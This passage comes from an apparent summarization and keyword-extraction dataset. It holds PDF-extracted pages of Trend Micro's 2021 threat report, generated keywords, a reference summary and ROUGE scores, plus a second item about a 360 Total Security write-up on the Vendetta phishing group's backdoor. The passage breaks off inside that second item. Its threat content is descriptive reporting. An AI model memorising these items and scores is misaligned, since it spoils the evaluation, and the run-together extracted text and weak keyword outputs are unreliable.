1B1.5B2B2.5B3B3.5B05B10B15B20B79,743,156,63789,032,192,911Email reputation queries2,338,754,688,0443,353,131,929,834URL reputation queries1,523,957,334,5141,920,529,076,114File reputation queries020B40B60B80B100B0500B1.5T2.5T3.5T0500B1T1.5T2T35,156,91737,088,836Blocked mobile app threats4,618,4605,921,414Blocked IoT threats3,818,082,7563,073,227,623Blocked threats010M20M30M40M02M4M6M01B2B3B4BFigure 20. A comparison of the numbers of blocked email, URL, and file threats, of email, URL, and file reputation queries, and of blocked mobile app, IoT, and Smart Home Network threats in 2020 and 2021Source: Trend Micro Smart Protection Network, including Mobile App Reputation Service, IoTReputation Service, and Smart Home Network32 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportThe malware families that dominated the threat landscape of 2021 were led by cryptocurrency miners,followed closely by web shells and the trojan Ulise. WannaCry, which topped the list in 2020, continuedto be the only ransomware among them. We detected 78 new ransomware families in 2021, a 39% year-on-year decrease.150,909149,290145,32197,58571,32866,14959,78354,88550,71245,245CoinminerWebshellUliseWannaCryDownadNemucodDLoaderSalityPowloadGamarue050K100K150K200KFigure 21. The top 10 malware families in terms of detections in 2021Source: Trend Micro Smart Protection Network12778202020210306090120150Figure 22. A comparison of the detections of new ransomware families in 2020 and 2021Source: Trend Micro Smart Protection Network33 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportJanFebMarAprMayJunAmjixiusSophCryptIziCryptCryngTrojanLockVoidCryptNitroSharpCrypterHDLockerHogLockerAstroLockerCicadaSickRansomOnCryptHantaVenusHadesQLockerBabukFakeRyukLegionLockerBlackHoleApostriusDarkRadiationLuciferButwoFlamingoCNHCryptDadiCryptAssistHelpYouThunderCryptGangBangDarkWorldWhiteBlackCryptFiveHandsGonnaCryptTaihenchanNetwormNoCryCrysis.TibgghBlueCrabJudgeMijnalNamasteGunshotGaryTestMolochPsixtinJulAugSepOctNovDecGriefGoFiveRedDotHKittyEpsiredRansomartKCryPolarisSplinjokLokiLockerQuantumLockerBlackCatTimeCryptHQCryptColossusRookHiveCyratCalCryptDiavolSanwaiAvosLockerAtomSiloBlackMatterMorrisCryptLockFileRantuChaosBuilderChaosTable 3. The new ransomware families detected in 2021Source: Trend Micro Smart Protection Network34 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportIn 2021, there was a 14% year-on-year increase in mobile device\u2013related malicious samples. There wasalso an uptick in the number of blocked Android mobile apps, which were 5% more than in the previousyear.7,880,0488,962,1722020202102M4M6M8M10MFigure 23. A comparison of the detections of mobile device\u2013related malicious samples in 2020 and 2021Source: Trend Micro Mobile App Reputation Service35,156,91737,088,83620202021010M20M30M40MFigure 24. A comparison of the numbers of blocked malicious Android apps in 2020 and 2021Source: Trend Micro Mobile App Reputation Service35 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportReferences1 Trend Micro. (Dec. 20, 2021). Trend Micro. \u201cRansomware Spotlight: REvil.\u201d Accessed on Jan. 28, 2022, at url Trend Micro. (Dec. 1, 2021). Trend Micro. \u201cRansomware Spotlight: Conti.\u201d Accessed on Jan. 28, 2022, at url Trend Micro. (Nov. 10, 2021). Trend Micro. \u201cVoid Balaur and the Rise of the Cybermercenary Industry.\u201d Accessed on Jan. 29,2022, at url Nick Dai, Ted Lee, and Vickie Su. (Dec. 14, 2021). Trend Micro. \u201dCollecting In the Dark: Tropic Trooper Targets Transportationand Government.\u201d Accessed on Jan. 29, 2022, at url tropic-trooper-targets-transportation-and-government-organizations.html.5 Mohamed Fahmy, Sherif Magdy and Abdelrhman Sharshar. (Nov. 19, 2021). Trend Micro. \u201cSquirrelwaffle Exploits ProxyShell and ProxyLogon to Hijack Email Chains.\u201d Accessed on Jan. 28, 2022, at url Squirrelwaffle-Exploits-ProxyShell-and-ProxyLogon-to-Hijack-Email-Chains.html.6 Ranga Duraisamy, Ashish Verma, Miguel Carlo Ang, and Nitesh Surana. (Dec. 13, 2021). Trend Micro. \u201cPatch Now: Apache Log4j Vulnerability Called Log4Shell Actively Exploited.\u201d Accessed on Jan. 29, 2022, at url research/21/l/patch-now-apache-log4j-vulnerability-called-log4shell-being-acti.html.7 Trend Micro. (Aug. 28, 2018). Trend Micro. \u201cTrend Micro Report Reveals Criminals Increasingly Drawn To Low-Profile Attacks.\u201dAccessed on Feb. 22, 2022, at url Increasingly-Drawn-To-Low-Profile-Attacks.8 David Sancho. (Jan. 30, 2018). Trend Micro. \u201cDigital Extortion: A Forward-looking View.\u201d Accessed on Feb. 22, 2022, aturl Trend Micro. (June 8, 2021). Trend Micro. \u201cModern Ransomware\u2019s Double Extortion Tactics and How to Protect Enterprises Against Them.\u201d Accessed on Jan. 30, 2022, at url threats/modern-ransomwares-double-extortion-tactics-and-how-to-protect-enterprises-against-them.10 Puja Mahendru. (May 17, 2021). Sophos. \u201cThe State of Ransomware in Healthcare 2021.\u201d Accessed on Feb. 21, 2022, aturl Stephane Duguin. (Nov. 8, 2021). World Economic Forum. \u201cIf healthcare doesn\u2019t strengthen its cybersecurity, it could soon bein critical condition.\u201d Accessed on Feb. 22, 2022, at url Trend Micro. (Nov. 23, 2021). Trend Micro. \u201cExamining Erratic Modern Ransomware Activities.\u201d Accessed on Jan. 30,2022, at url ransomwareactivities-ransomware-in-q3-2021.13 Abraham Camba, Catherine Loveria, Ryan Maglaque, and Buddy Tancio. (July 5, 2021). Trend Micro. \u201cTracking Cobalt Strike: A Trend Micro Vision One Investigation.\u201d Accessed on March 11, 2022, at url tracking_cobalt_strike_a_vision_one_investigation.html.14 Trend Micro. (Dec. 1, 2021). Trend Micro. \u201cRansomware Spotlight: Conti\u201d Accessed on March 11, 2022, at url Trend Micro. (Nov. 4, 2020). Trend Micro. \u201cRyuk 2020: Distributing Ransomware via TrickBot and BazarLoader.\u201d Accessedon March 11, 2022, at url distributing-ransomware-via-trickbot-and-bazarloader.16 Trend Micro. (Dec. 1, 2021). Trend Micro. \u201cRansomware Spotlight: Conti\u201d Accessed on March 11, 2022, at url Trend Micro. (Nov. 4, 2020). Trend Micro. \u201cRyuk 2020: Distributing Ransomware via TrickBot and BazarLoader.\u201d Accessedon March 11, 2022, at url distributing-ransomware-via-trickbot-and-bazarloader.18 Trend Micro. (Sept. 7, 2016). Trend Micro. \u201cRansomware as a Service Offered in the Deep Web: What This Means forEnterprises.\u201d Accessed on Jan. 25, 2022, at url threats/ransomware-as-a-service-what-this-means-for-enterprises.36 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity Report19 Fyodor Yarochkin. (Oct. 5, 2021). Trend Micro. \u201cRansomware as a Service: Enabler of Widespread Attacks.\u201d Accessed on Jan.25, 2022, at url enabler-of-widespread-attacks.20 Trend Micro. (Nov. 30, 2021). Trend Micro. \u201cInvestigating the Emerging Access-as-a-Service Market.\u201d Accessed on Feb. 22,2022, at url access-as-a-service-market.21 Janus Agcaoili, Miguel Ang, Earle Earnshaw, Byron Gelera, and Nikko Tama\u00f1a. (June 15, 2021). Trend Micro. \u201cRansomware Double Extortion and Beyond: REvil, Clop, and Conti.\u201d Accessed on Jan. 25, 2022, at url security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti.22 Pierre Cadieux, Colin Grady, Jaeson Schultz, and Matt Valites. (April 30, 2019). Cisco Talos. \u201cSodinokibi ransomware exploitsWebLogic Server vulnerability.\u201d Accessed on Feb. 22, 2022, at url ransomware-exploits-weblogic.html.23 Michael Novinson. (April 23, 2021). CRN. \u201cApple Menaced After REvil Ransomware Attack Against Supplier.\u201d Accessed onFeb. 18, 2022, at url NPR. (June 3, 2021). NPR. \u201cREvil, A Notorious Ransomware Gang, Was Behind JBS Cyberattack, The FBI Says.\u201d Accessedon Feb. 18, 2022, at url cyberattack-the-fbi-says.25 Brian Fung. (July 3, 2021). CNN. \u201cNew ransomware attack targets key IT vendor.\u201d Accessed on Feb. 18, 2022, at url Trend Micro. (Dec. 20, 2021). Trend Micro. \u201cRansomware Spotlight: REvil.\u201d Accessed on Jan. 28, 2022, at url Trend Micro. (Dec. 20, 2021). Trend Micro. \u201cRansomware Spotlight: REvil.\u201d Accessed on Feb. 22, 2022, at url Alvin Nieto, Mark Vicente, RonJay Caragay, Miguel Carlo Ang, McJustine De Guzman, Emmanuel Evangelista, Divina Chua, and Marco Dela Vega. (March 19, 2021). Trend Micro. \u201cTrend Micro Vision One: Tracking Conti Ransomware.\u201d Accessed on Jan. 28, 2022, at url Trend Micro. (Dec. 1, 2021). Trend Micro. \u201cRansomware Spotlight: Conti.\u201d Accessed on Feb. 22, 2022, at url Trend Micro. (Sept. 22, 2021). Trend Micro. \u201cCyberattacks from all Angles: 2021 Midyear Report.\u201d Accessed on Jan. 28, 2022,at url Trend Micro. (Dec. 1, 2021). Trend Micro. \u201cRansomware Spotlight: Conti.\u201d Accessed on Jan. 28, 2022, at url Trend Micro. (Sept. 22, 2021). Trend Micro. \u201cCyber Risk Index (CRI): Trend Micro and the Ponemon Institute investigatecybersecurity gaps.\u201d Accessed on Feb. 21, 2022, at url cyber-risk-index.html.33 Jon Clay. (Sept. 14, 2021). Trend Micro. \u201c1H\u20192021 Security Review Shows Active Cloud Attacks.\u201d Accessed on Feb. 21, 2022,at url Trend Micro. (March 10, 2020). Trend Micro. \u201cTrend Micro Cloud App Security Report 2019.\u201d Accessed on Feb. 28, 2022, aturl report-2019.35 Trend Micro. (Sept. 22, 2021). Trend Micro. \u201cCyberattacks from all Angles: 2021 Midyear Report.\u201d Accessed on Feb. 21, 2022,at url Business Wire. (Jan. 13, 2022). Business Wire. \u201cThe Most Common Cloud Misconfigurations That Could Lead to SecurityBreaches.\u201d Accessed on Jan. 30, 2022, at url Infrastructure-Spending-Increased-in-Third-Quarter-of-2021-with-Overall-Growth-Expected-for-2021-According-to-IDC.37 Trend Micro. (Oct. 25, 2021). Trend Micro. \u201cThe Most Common Cloud Misconfigurations That Could Lead to SecurityBreaches.\u201d Accessed on Jan. 30, 2022, at url most-common-cloud-misconfigurations-that-could-lead-to-security-breaches.37 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity Report38 Larry Dignan. (Dec. 22, 2021). ZDNet. \u201cTop cloud providers: AWS, Microsoft Azure, and Google Cloud, hybrid, SaaS players.\u201dAccessed on March 14, 2022, at url google-cloud-hybrid-saas.39 Aaron Ansari. (Nov. 30, 2021). Trend Micro. \u201cWhat You Can Do to Mitigate Cloud Misconfigurations.\u201d Accessed on Jan. 30,2022, at url Trend Micro. (Nov. 9, 2021). Trend Micro. \u201cCompromised Docker Hub Accounts Abused for Cryptomining Linked to TeamTNT.\u201dAccessed on Jan. 30, 2022, at url abused-for-cryptomining-linked-t.html.41 David Fiser and Alfredo Oliveira. (Nov. 11, 2021). Trend Micro. \u201cTeamTNT Upgrades Arsenal, Refines Focus on Kubernetesand GPU Environments.\u201d Accessed on Jan. 30, 2022, at url arsenal-refines-focus-on-kubernetes-and-gpu-env.html.42 Magno Logan and David Fiser. (May 25, 2021). Trend Micro. \u201cTeamTNT Targets Kubernetes, Nearly 50,000 IPs Compromisedin Worm-like Attack.\u201d Accessed on Jan. 28, 2022, at url kubernetes--nearly-50-000-ips-compromised.html.43 PurpleSec. (n.d.). PurpleSec. \u201c2021 Cyber Security Statistics.\u201d Accessed on March 1, 2022, at url Cisco. (n.d.). Cisco. \u201c2021 Cybersecurity threat trends: phishing, crypto top the list.\u201d Accessed on March 1, 2022, at url Trend Micro. (Dec. 7, 2021). Trend Micro. \u201cMalware Awareness - EMOTET resurges with new detections.\u201d Accessed on Jan.30, 2022, at url Erin Johnson. (March 2, 2021). Trend Micro. \u201cEmotet One Month After the Takedown.\u201d Accessed on Jan. 30, 2022, at url Trend Micro. (Sept. 14, 2021). Trend Micro. \u201cAttacks Surge in 1H 2021 as Trend Micro Blocks 41 Billion Cyber Threats.\u201dAccessed on Jan. 28, 2022, at url Blocks-41-Billion-Cyber-Threats.48 Ali Neil. (Nov. 23, 2021). Dark Reading. \u201cDon\u2019t Help Cybercriminals Dash With Your Customers\u2019 Cash This Black Friday.\u201dAccessed on Feb. 21, 2022, at url your-customers-cash-this-black-friday.49 Business Wire. (Sept. 9, 2021). Business Wire. \u201cInformation Technology Global Market Report 2021: IT Services; ComputerHardware; Telecom; Software Products - Forecast to 2025 & 2030 - ResearchAndMarkets.com.\u201d Accessed on March 8, 2022, at url Services-Computer-Hardware-Telecom-Software-Products---Forecast-to-2025-2030---ResearchAndMarkets.com.50 Sally Adam. (Aug. 31, 2021). Sophos. \u201cThe State of Ransomware in Retail 2021.\u201d Accessed on March 7, 2022, at url Katie Kuehner-Hebert. (Dec. 13, 2021). Constructor Magazine. \u201cAn increasing dependency on technology demands betterasset protection.\u201d Accessed on March 8, 2022, at url Trend Micro. (April 10, 2018). Trend Micro. \u201cA Historical Overview of Proactive Incident Response Strategies and What They Mean to Enterprises.\u201d Accessed on Feb. 11, 2022, at url digital-threats/historical-overview-of-proactive-incident-response-strategies-and-what-they-mean-to-enterprises.53 Trend Micro. (Nov. 9, 2015). Trend Micro. \u201cUnderstanding Targeted Attacks: Six Components of Targeted Attacks.\u201d Accessedon Jan. 28, 2022, at url Trend Micro. (Sept. 22, 2021). Trend Micro. \u201cCyberattacks from all Angles: 2021 Midyear Report.\u201d Accessed on Jan. 28, 2022,at url Trend Micro. (Oct. 8, 2015). Trend Micro. \u201cUnderstanding Targeted Attacks: The Impact of Targeted Attacks.\u201d Accessed onJan. 28, 2022, at url Trend Micro. (Sept. 24, 2015). Trend Micro. \u201cUnderstanding Targeted Attacks: What is a Targeted Attack?\u201d Accessed on Jan.28, 2022, at url targeted-attack.38 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity Report57 Trend Micro. (Nov. 10, 2021). Trend Micro. \u201cVoid Balaur and the Rise of the Cybermercenary Industry.\u201d Accessed on Jan. 29,2022, at url Trend Micro. (Nov. 10, 2021). Trend Micro. \u201cThe far-reaching attacks of the Void Balaur cybermercenary group.\u201d Accessed on Jan. 29, 2022, at url of-the-void-balaur-cybermercenary-group.59 Nick Dai, Ted Lee, and Vickie Su. (Dec. 14, 2021). Trend Micro. \u201cCollecting In the Dark: Tropic Trooper Targets Transportationand Government.\u201d Accessed on Jan. 29, 2022, at url tropic-trooper-targets-transportation-and-government-organizations.html.60 Ian Kenefick. (Nov. 23, 2021). Trend Micro. \u201cBazarLoader Adds Compromised Installers, ISO to Arrival and Delivery Vectors.\u201d Accessed on Jan. 29, 2022, at url iso-to-arrival-delivery-vectors.html.61 Raphael Centeno, Don Ovid Ladores, Lala Manly, Junestherry Salvador, and Frankylnn Uy. (April 12, 2021). Trend Micro. \u201cASpike in BazarCall and IcedID Activity Detected in March.\u201d Accessed on Feb, 18, 2022, at url en_us/research/21/d/a-spike-in-bazarcall-and-icedid-activity.html.62 Homeland Security. (November 2010). Homeland Security. \u201cSector Open Source Digest.\u201d Accessed on Feb. 21, 2022, aturl Ian Kenefick. (Nov. 13, 2021). Trend Micro. \u201cQAKBOT Loader Returns With New Techniques and Tools.\u201d Accessed on Jan. 29,2022, at url Christopher Boyton. (Nov. 5, 2021). Trend Micro. \u201cA Review and Analysis of 2021 Buer Loader Campaigns.\u201d Accessed on Jan.29, 2022, at url Aliakbar Zahravi and William Gamazo Sanchez. (Sept. 20, 2021). Fortinet. \u201cWater Basilisk Uses New HCrypt Variant to Flood Victims with RAT Payloads.\u201d Accessed on Jan. 27, 2022, at url Uses-New-HCrypt-Variant-to-Flood-Victims-with-RAT-Payloads.html.66 Aliakbar Zahravi and William Gamazo Sanchez. (Sept. 20, 2021). Trend Micro. \u201cWater Basilisk Uses New HCrypt Variant to Flood Victims with RAT Payloads.\u201d Accessed on Jan. 29, 2022, at url Basilisk-Uses-New-HCrypt-Variant-to-Flood-Victims-with-RAT-Payloads.html.67 Kaseya. (Feb. 22, 2022). Kaseya. \u201cPatch Management Policy Features, Benefits and Best Practices.\u201d Accessed on Feb. 22,2022, at url Trend Micro. (April 7, 2021). Trend Micro. \u201cThe Nightmares of Patch Management: The Status Quo and Beyond.\u201d Accessed onFeb. 21, 2022, at url management-the-status-quo-and-beyond.69 Trend Micro. (July 13, 2021). Trend Micro. \u201cNearly a Quarter of Exploits Sold on Cybercriminal Underground Are More ThanThree Years Old.\u201d Accessed on Jan. 29, 2022, at url Sold-on-Cybercriminal-Underground-Are-More-Than-Three-Years-Old.70 Trend Micro. (July 13, 2021). Trend Micro. \u201cTrends and shifts in the underground N-day exploit market.\u201d Accessed on Jan.29, 2022, at url underground-n-day-exploit-market.71 Microsoft Security Response Center. (Aug. 13, 2019). Microsoft Security Response Center. \u201cRemote Desktop Protocol ServerInformation Disclosure Vulnerability: CVE-2019-1225.\u201d Accessed on Jan. 28, 2022, at url guide/en-us/vulnerability/CVE-2019-1225.72 CVE report. (Sept. 2, 2017). CVE.report. \u201cCVE-2017-14100.\u201d Accessed on Jan. 29, 2022, at url Ranga Duraisamy, Ashish Verma, Miguel Carlo Ang, and Nitesh Surana. (Dec. 13, 2021). Trend Micro. \u201cPatch Now: Apache Log4j Vulnerability Called Log4Shell Actively Exploited.\u201d Accessed on Feb. 21, 2022, at url research/21/l/patch-now-apache-log4j-vulnerability-called-log4shell-being-acti.html.74 Trend Micro. (Dec. 22, 2021). Trend Micro. \u201cThe Log4j story, and how it has impacted our customers.\u201d Accessed on Jan. 29,2022, at url | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity Report75 Ranga Duraisamy, Ashish Verma, Miguel Carlo Ang, and Nitesh Surana. (Dec. 13, 2021). Trend Micro. \u201cPatch Now: Apache Log4j Vulnerability Called Log4Shell Actively Exploited.\u201d Accessed on Jan. 29, 2022, at url research/21/l/patch-now-apache-log4j-vulnerability-called-log4shell-being-acti.html.76 Trend Micro. (Dec. 22, 2021). Trend Micro. \u201cThe Log4j story, and how it has impacted our customers.\u201d Accessed on Feb. 21,2022, at url Lisa Vaas. (Nov. 22, 2021). ThreatPost. \u201cAttackers Hijack Email Threads Using ProxyLogon/ProxyShell Flaws.\u201d Accessed onFeb. 21, 2022, at url Arianne Dela Cruz, Cris Tomboc, Jayson Chong, Nikki Madayag, and Sean Torre. (May 6, 2021). Trend Micro. \u201cProxylogon: A Coinminer, a Ransomware, and a Botnet Join the Party.\u201d Accessed on Feb. 21, 2022, at url research/21/e/proxylogon-a-coinminer--a-ransomware--and-a-botnet-join-the-part.html.79 Edmund Brumaghin, Mariano Graziano, and Nick Mavis. (Oct. 26, 2021). Cisco Talos. \u201cSquirrelwaffle Leverages malspam to deliver Qakbot, Cobalt Strike.\u201d Accessed on Feb. 22, 2021, at url emerges.html.80 Jon Clay. (Dec. 13, 2021). Trend Micro. \u201cThis Week in Security News - December 3, 2021.\u201d Accessed on Jan. 28, 2022, aturl Mohamed Fahmy, Sherif Magdy and Abdelrhman Sharshar. (Nov. 19, 2021). Trend Micro. \u201cSquirrelwaffle Exploits ProxyShell and ProxyLogon to Hijack Email Chains.\u201d Accessed on Jan. 28, 2022, at url Squirrelwaffle-Exploits-ProxyShell-and-ProxyLogon-to-Hijack-Email-Chains.html.82 Melanie Tafelski. (Nov. 9, 2021). Trend Micro. \u201cCybersecurity Trends from the Global Pandemic.\u201d Accessed on Jan. 28, 2022,at url Atlas VPN. (n.d.). Atlas VPN. \u201cGlobal VPN Adoption Index.\u201d Accessed on Jan. 28, 2022, at url Fortinet. (Aug. 28, 2019). Fortinet. \u201cFortiOS and SSL Vulnerabilities.\u201d Accessed on Jan. 27, 2022, at url National Vulnerability Database. (June 4, 2019). National Vulnerability Database. \u201cCVE-2018-13379 Detail.\u201d Accessed on Jan.27, 2022, at url Trend Micro. (Jan. 26, 2021). Trend Micro. \u201cExamining A Sodinokibi Attack.\u201d Accessed on Jan. 27, 2022, at url Trend Micro. (Dec. 1, 2021). Trend Micro. \u201cRansomware Spotlight: Conti.\u201d Accessed on Feb. 21, 2022, at url Trend Micro. (Dec. 16, 2021). Trend Micro. \u201cAddressing Cloud-Related Threats to the IoT Addressing Cloud-Related Threats to the IoT.\u201d Accessed on Jan. 30, 2022, at url cloud-related-threats-to-the-iot.89 Trend Micro. (n.d.). Trend Micro. \u201cHow to Reduce the Risk of Phishing and Ransomware: Osterman Research White Paper.\u201dAccessed on Jan. 30, 2022, at url Zero Day Initiative. (Nov. 1, 2021). Zero Day Initiative. \u201cPwn2Own Austin 2021 - Schedule and Live Results.\u201d Accessed onMarch 1, 2022, at url Eduard Kovacs. (Nov. 5, 2021). Security Week. \u201cDevice Exploits Earn Hackers Over $1 Million at Pwn2Own Austin 2021.\u201dAccessed on March 1, 2022, at url austin-2021.92 Jon Clay. (July 21, 2021). Trend Micro. \u201cReduce Instances of Covid-19 Phishing Email Attacks.\u201d Accessed on Jan. 30, 2022,at url Paul Pajares. (July 8, 2021). Trend Micro. \u201cThreats Ride on the Covid-19 Vaccination Wave.\u201d Accessed on Jan. 30, 2022, aturl US Department of Health and Human Services. (Feb. 3, 2022). US Department of Health and Human Services. \u201cLessonsLearned from the HSE Cyber Attack.\u201d Accessed on March 7, 2022, at url hse-attack.pdf.40 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity Report95 IntSights. (n.d.). IntSights. \u201cBuilding Immunity: The 2021 Healthcare and Pharmaceutical Industry Cyber Threat LandscapeReport.\u201d Accessed on March 7, 2022, at url Healthcare-Pharma%20Report-2021.pdf.96 Nic Newman. (n.d.). Reuters Institute for the Study of Journalism. \u201c2021 Digital News Report: Executive summary and keyfindings of the 2021 report.\u201d Accessed on Feb. 11, 2022, at url dnr-executive-summary.97 Felix Richter. (Feb. 4, 2021). World Economic Forum. \u201cCOVID-19 has caused a huge amount of lost working hours.\u201d Accessedon Feb. 11, 2022, at url International Labour Organization. (Oct. 27, 2021). International Labour Organization. \u201cILO: Employment impact of thepandemic worse than expected.\u201d Accessed on Feb. 11, 2022, at url WCMS_824098/lang--en/index.htm.99 World Economic Forum. (Jan. 18, 2021). World Economic Forum. \u201cClosing the Cyber Gap: Business and Security Leaders at Crossroads as Cybercrime Spikes.\u201d Accessed on Jan. 30, 2022, at url cyber-gap-business-and-security-leaders-at-crossroads-as-cybercrime-spikes.100 Trend Micro. (Sept. 28, 2021). Trend Micro. \u201cIoT and Ransomware: A Recipe for Disruption.\u201d Accessed on March 1, 2022, aturl Rajat Bhargava. (Feb. 9, 2021). Forbes. \u201cWhy The \u2018New Normal\u2019 Requires Zero Trust.\u201d Accessed on Jan. 30, 2022, at url Trend Micro. (Feb. 9, 2021). Trend Micro. \u201cWhat Is Zero Trust and Why Does It Matter?\u201d Accessed on Jan. 30, 2022, at url Security Magazine. (May 4, 2021). Security Magazine. \u201cCybersecurity workforce minimally impacted by pandemic, butstill grappling with persistent hiring challenges.\u201d Accessed on Feb. 11, 2022, at url articles/95123-cybersecurity-workforce-minimally-impacted-by-pandemic-but-still-grappling-with-persistent-hiring- challenges.104 Danny Palmer. (Aug. 2, 2021). ZDNet. \u201cThe cybersecurity jobs crisis is getting worse, and companies are making basicmistakes with hiring.\u201d Accessed on Feb. 11, 2022, at url worse-and-companies-are-making-basic-mistakes-with-hiring.105 Michael Paladino. (April 16, 2021). Forbes. \u201cBreaking Down Data Silos Takes A Cultural Shift.\u201d Accessed on Feb. 11, 2022, aturl Trend Micro. (Oct. 29, 2020). Trend Micro. \u201cThe Real Frontiers for 2021 in XDR.\u201d Accessed on Feb. 11, 2022, at url Scott Ikeda. (Feb. 17, 2021). CPO Magazine. \u201cBalancing the Challenges: Fear and Cost in Compliance With Regulations.\u201d Accessed on Feb. 11, 2022, at url compliance-with-regulations.41 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportTREND MICROTM RESEARCH Trend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information.Trend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and supporting efforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in vulnerability disclosures, and publishes innovative research on new threat techniques. We continually work to anticipate new threats and deliver thought-provoking research.www.trendmicro.com ", "generated_text": "Trend Micro; 2021; 50; ransomware attacks; critical industries; 94 billion threats; the threat landscape; Ransomware families; REvil1; Conti; use; automation; a more hands-on approach; a more hands-on, long-haul approach; Targeted Attacks; Cloud Adopters; remote workers; risks; the rise; critical vulnerabilities; the threat landscape; payloads; Emulation; C2; infrastructure; the report; the threat landscape; detection; response; military; forensics; the threat landscape; new threats; a host; techniques; threats; mitigation; threats; monitoring; awareness; the threat landscape; infrastructure; resilience; training; systems.", "ref_text": "<START-1>The report provides an overview of the major cybersecurity threats and trends in 2021. Ransomware attacks grew more targeted, with modern ransomware groups like REvil and Conti moving away from widespread campaigns to focus on bigger, more profitable targets in critical industries like healthcare. Cloud environments saw rising threats, often due to misconfigurations that left servers and data vulnerable. Threat actors increasingly used sophisticated social engineering and upgraded tools for targeted attacks on businesses, government entities, and supply chains. Critical vulnerabilities like Log4Shell caused widespread exploits and issues patched flaws like ProxyLogon were still abused. Pandemic-related threats remained prevalent, evolving to use COVID-19 themes in phishing lures. Overall threat detections blocked by Trend Micro dropped around 20% from 2020, but certain threats like ransomware declined while malicious files spiked over 380%. Banking trojans and information stealers remained active infection vectors. The report highlights the need for a robust, layered security approach across cloud, network, email, endpoint and mobile environments. Trend Micro blocked over 94 billion threats in 2021. Key metrics showed spikes in blocked threats and reputation queries. The report emphasizes gaining visibility into the expanded attack surface and having adaptive threat monitoring and response capabilities to address persistent and emerging risks. It advises using security platforms that provide centralized visibility, analytics and automated protection. <END-1>", "t5/keyword/hint_hit_precision": 0.3111111111111111, "t5/word/hint_hit_recall": 0.10232558139534884, "gpt3/lexical/rouge_rouge1": 0.4709302325581395, "gpt3/lexical/rouge_rouge2": 0.14619883040935672, "gpt3/lexical/rouge_rougeL": 0.23255813953488375, "gpt3/lexical/rouge_rougeLsum": 0.23255813953488375, "gpt3_generated_text": ["The 2021 Trend Micro Annual Cybersecurity Report delves into the evolving threat landscape, with a focus on modern ransomware actors targeting critical industries. Ransomware families like REvil and Conti have shifted from automated attacks to a more hands-on, long-haul approach tailored to high-value targets. Meanwhile, targeted attacks have become more sophisticated, utilizing upgraded toolboxes and customized tools. The report also highlights the rise of critical vulnerabilities, particularly in cloud environments, and the need for robust defense strategies. With over 94 billion threats detected in 2021, organizations are urged to enhance their security postures through adaptive threat monitoring, detection, and response strategies. The report provides valuable insights for navigating new frontiers in cybersecurity, emphasizing the importance of awareness, resilience, and training to mitigate evolving threats."]}, {"split_name": "val", "sample_id": "val_10", "prompt_text": "Extract the keywords: 5/15/2020Vendetta-new-threat-actor-from-EuropeVendetta-new threat actor from Europe blog.360totalsecurity.com/en/vendetta-new-threat-actor-from-europeMay 14, 2020Learn more about 360 Total Security Starting in April this year, 360 Baize Lab intercepted a large number of attack samples from an unknown hacker organization. The hacker organization sent a phishing email to the victim by forging a police station investigation letter, COVID-19 detection notice, etc. , Through the backdoor virus to control the victim\u2019s machine, steal valuable sensitive data related to the target.The PDB path of the virus samples used by the organization points to a user named \u201cVendetta\u201d, and we will later also name the hacker organization Vendetta:\u201cC:\\Users\\Vendetta\\source\\repos\\{project name}\\*\\obj\\Debug\\{project name}.pdb\u201dIn some samples, we have repeatedly detected the following tags, the virus author claims that he is from Italy:However, we found in the naming of virus samples that virus authors like to use certain Turkish names to name variables, such as \u201cRoboSki\u201d, so we suspect that the organization originated in Europe:Vendetta is a hacker organization that is very good at using social engineering. They forge phishing emails very realistically. They can easily gain users\u2019 trust and guide users to open the malicious programs they carry.The picture below is a Vendetta forgery of the investigation letter issued by the Austrian Federal Ministry of the Interior (BMI)url investigation letter from the Romanian police station:url the COVID-19 virus test email issued by the Australian Government Department of Health. The email stated that the victim had contact with a con\ufb01rmed case within the past 14 days. It is recommended to read the test guide in the attachment and accept the test:url a virus test email issued by the Mexican health department:url well as the forged email quoted by the Egyptian Orascom Group:.url compressed \ufb01le in the email attachment contains the Trojan \ufb01le, which is generally named after pdf.exe, Document.exe, etc. After running, it decrypts and loads the subsequent virus module in memory.url In all samples, we detected the same type of code obfuscator, and according to its PDB debugging path, we named it RoboSki:RoboSki encrypts and stores the shellcode in the pixels of the picture. The following \ufb01gure is the code logic to extract the available pixel data and decrypt the shellcode:url execution logic of ReZer0 is controlled by hard-coded built-in instructions. According to different instructions, different malicious functions are executed. Its design logic resembles the design method of backdoor programs:url have sorted out the hard-coded instructions and their corresponding meanings, most of which are not used:Hardcode[x] Description 0[0] == 4 load the plugin from the resource into memory [0]! = 4 Inject the plugin in the resource into the system process to execute Whether to register scheduled tasks Download and execute any \ufb01le Download \ufb01le URL The execution path of the downloaded \ufb01le1 6url 35Whether to detect the virtual machine Whether to detect sandbox ByPass antivirus software Show \ufb01le version Sleep() Sleep durationIn the 360 massive data, we found that ReZer0 has an obvious version identi\ufb01cation. In conjunction with the above-mentioned large number of instructions used, we speculate that the software is still in the development stage, and it will not be ruled out that the program will be controlled through network communication in the future:In addition to the nature of the backdoor virus, ReZer0 also carries known remote control Trojans such as NanoCore and Remcos in the resources. We will not repeat the remote control functions such as NanoCore. We take some of the victims of Vendetta as an example to speculate the purpose of their actions.url Fruit Company of Australia (PAI) is a representative institution and a non-pro\ufb01t membership organization that supports the passion fruit industry in Australia. PAI is an umbrella organization that represents and enhances the interests of everyone in the passion fruit industry, including growers, packers, wholesalers, exporters, researchers, and retail stores.Of course, Vendetta\u2019s attack target is not only the PAI family. We have roughly described the distribution of Vendetta\u2019s attack target by statistically the distribution of related samples, and its attack purpose is to steal related commercial information.url is an active hacking organization that started in April 2020. The organization may have originated in Europe. It is good at using social engineering to launch cyber attacks. The purpose of the attack is to steal targeted business intelligence.", "generated_text": "the PDF; 360 Total Security; April; 